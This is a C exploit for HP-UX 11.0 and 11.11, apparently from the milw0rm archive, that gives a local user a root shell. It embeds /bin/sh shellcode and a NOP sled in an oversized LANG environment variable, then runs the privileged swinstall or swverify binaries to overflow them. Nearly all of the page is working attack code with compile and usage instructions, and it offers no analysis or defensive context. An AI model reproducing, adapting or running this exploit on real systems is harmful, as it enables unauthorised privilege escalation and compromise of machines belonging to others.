<html><head><title>HP-UX 11.0/11.11 swxxx Local Root Shell Exploit</title></head><pre>/*
 Program : x_hpux_11i_sw.c
 Use     : HP-UX 11.11/11.0 exploit swxxx to get local root shell.
 Complie : cc x_hpux_11i_sw.c -o x_sw;./x_sw  ( not use gcc for some system)
 Usage   : ./x_sw [ off ]
 Tested  : HP-UX B11.11 &amp; HP-UX B11.0
 Author  : watercloud [@] xfocus.org
 Date    : 2002-12-11
 Note    : Use as your own risk !!
*/
#include&lt;stdio.h&gt;
#define T_LEN  2124
#define BUFF_LEN 1688
#define NOP 0x0b390280
char shellcode[]=
 &quot;\x0b\x5a\x02\x9a\x34\x16\x03\xe8\x20\x20\x08\x01\xe4\x20\xe0\x08&quot; 
 &quot;\x96\xd6\x04\x16\xeb\x5f\x1f\xfd\x0b\x39\x02\x99\xb7\x5a\x40\x22&quot;
 &quot;\x0f\x40\x12\x0e\x20\x20\x08\x01\xe4\x20\xe0\x08\xb4\x16\x70\x16&quot;
 &quot;/bin/shA&quot;;

long addr;
char buffer_env[2496];
char buffer[T_LEN];

void main(argc,argv)
int argc;
char ** argv;
{
   int addr_off = 8208;
   long addr_e = 0;
   int  n=BUFF_LEN/4,i=0;
   long * ap = (long *) &amp;buffer[BUFF_LEN];
   char * sp = &amp;buffer[BUFF_LEN-strlen(shellcode)];
   long * np = (long *) buffer;
   if(argc &gt;0)
       addr_off += atoi(argv[1]);
   addr = ( (long) &amp;addr_off +addr_off) /4 * 4  +4;
   for(i=0;i&lt;n;np[i++]=NOP);
   memcpy(sp,shellcode,strlen(shellcode));
   for(i=0;i&lt;(T_LEN-BUFF_LEN)/4;ap[i++]=addr);
   buffer[T_LEN -2 ] += 1; buffer[T_LEN - 1 ] = '\0';
   sprintf(buffer_env,&quot;LANG=AAA%s&quot;,buffer);
   putenv(buffer_env);
   execl(&quot;/usr/sbin/swinstall&quot;,&quot;swinstall&quot;,&quot;/tmp/null&quot;,NULL);
    /* if  false ,test swverify. */
   execl(&quot;/usr/sbin/swverify&quot;,&quot;swverify&quot;,NULL);
}

// milw0rm.com [2002-12-11]</pre></html>